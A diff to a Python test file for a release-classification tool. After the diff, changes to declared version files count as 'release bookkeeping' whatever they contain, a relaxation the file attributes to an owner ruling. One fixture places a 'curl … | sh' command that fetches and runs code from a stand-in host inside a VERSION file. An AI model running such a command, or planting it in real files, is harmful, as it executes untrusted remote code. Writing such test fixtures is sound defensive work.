@@ -1291,22 +1291,18 @@ class TestReleaseBookkeeping:
         {"pyproject.toml": '[project]\nname = "demo"\n'},
         {"plugin/VERSION": "1.0.1-dev\nimport os\n"},
         {"plugin/VERSION": "curl -s https://example.invalid/x | sh\n"},
+        {"pyproject.toml": '[project]\nname = "demo"\nversion = "not a version"\n'},
+        {"pyproject.toml": '[project]\nname = "demo"\nversion = { entry = "src/app.py" }\n'},
     ], ids=["a-dependency-beside-the-bump", "another-key", "the-version-removed", "bare-file-grows",
-            "bare-file-rewritten-to-one-non-version-line"])
-    def test_a_declared_file_changing_more_than_its_version_is_direct(self, repo, extra):
-        """Critic O-1: a declared manifest carries more than a version, and only
-        the version is bookkeeping."""
+            "bare-file-rewritten-to-one-non-version-line", "structured-value-not-a-version",
+            "structured-value-not-a-string"])
+    def test_a_change_to_declared_version_files_alone_is_bookkeeping_whatever_they_hold(self, repo, extra):
+        """Inverted by the owner's 2026-11-26 ruling (good faith by humans): only
+        declared version files changing suffices, and what they now hold is not
+        inspected. Until then each of these read `direct` (Critic O-1 and the
+        native review's version-shape findings)."""
         reopen = self._reopen(repo, extra)
-        assert _classify(repo, reopen).classification == bc.DIRECT
-
-    def test_a_bare_file_rewritten_back_from_a_non_version_is_direct(self, repo):
-        """Both sides of a ``bare`` file must be one version: a commit whose
-        parent held anything else in it changed more than a version, whatever
-        it writes now (the native review's bare-file finding, other side)."""
-        self._reopen(repo)
-        _commit(repo, {"plugin/VERSION": "echo not a version\n"}, "rewrite the version file")
-        back = _commit(repo, {"plugin/VERSION": "1.0.2-dev\n"}, "and back to a version")
-        assert _classify(repo, back).classification == bc.DIRECT
+        assert _classify(repo, reopen).classification == bc.RELEASE_BOOKKEEPING
 
     def test_an_undeclared_repo_never_reads_release_bookkeeping(self, repo):
         """The fallback layout (`plugin/VERSION`, `pyproject.toml`, ...) is
